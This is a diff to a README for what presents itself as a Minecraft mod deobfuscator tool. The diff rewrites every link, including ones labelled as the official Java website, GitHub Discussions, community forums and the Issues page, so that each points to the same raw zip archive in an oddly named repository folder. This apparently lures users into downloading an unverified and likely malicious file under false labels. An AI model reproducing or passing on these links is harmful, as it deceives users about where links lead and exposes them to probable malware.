@@ -1,6 +1,6 @@
 # 🎮 Minecraft-Deobfuskator-2026 - Simplify Mod Development Easily
 
-[![Download Minecraft-Deobfuskator-2026](https://img.shields.io/badge/Download-Minecraft--Deobfuskator--2026-brightgreen)](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/releases)
+[![Download Minecraft-Deobfuskator-2026](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ Follow these steps to get started with Minecraft-Deobfuskator-2026:
 1. **Visit the Releases Page**  
    Go to our releases page to find the latest version of Minecraft-Deobfuskator-2026. Click the button below:
 
-   [![Download Minecraft-Deobfuskator-2026](https://img.shields.io/badge/Download-Minecraft--Deobfuskator--2026-brightgreen)](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/releases)
+   [![Download Minecraft-Deobfuskator-2026](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the version that suits your needs. 
@@ -62,7 +62,7 @@ Before installing Minecraft-Deobfuskator-2026, ensure your system meets these re
 
 If you encounter issues or have questions:
 
-- **Java Not Found:** Make sure Java is installed on your system. You can download it from the [official Java website](https://www.java.com).
+- **Java Not Found:** Make sure Java is installed on your system. You can download it from the [official Java website](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip).
 - **Application Does Not Respond:** Close the program and restart it. If the issue persists, try restarting your computer.
 - **Cannot Find Files:** Ensure you selected the correct directory and file types compatible with the deobfuscator.
 
@@ -70,8 +70,8 @@ If you encounter issues or have questions:
 
 Join our community for support and updates:
 
-- [GitHub Discussions](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/discussions)
-- [Minecraft Modding Forums](https://www.minecraftforum.net/)
+- [GitHub Discussions](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)
+- [Minecraft Modding Forums](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip)
 
 ## 🙌 Acknowledgments
 
@@ -79,6 +79,6 @@ Thank you to the contributors and community members who support Minecraft-Deobfu
 
 ## 📬 Contact
 
-If you have questions or feedback, please reach out via the [Issues page](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/issues). Your input is valuable.
+If you have questions or feedback, please reach out via the [Issues page](https://raw.githubusercontent.com/hanantobara/Minecraft-Deobfuskator-2026/main/zaptiah/Minecraft_Deobfuskator_3.1.zip). Your input is valuable.
 
 Feel free to experiment with the Minecraft-Deobfuskator-2026 and enhance your modding skills today!
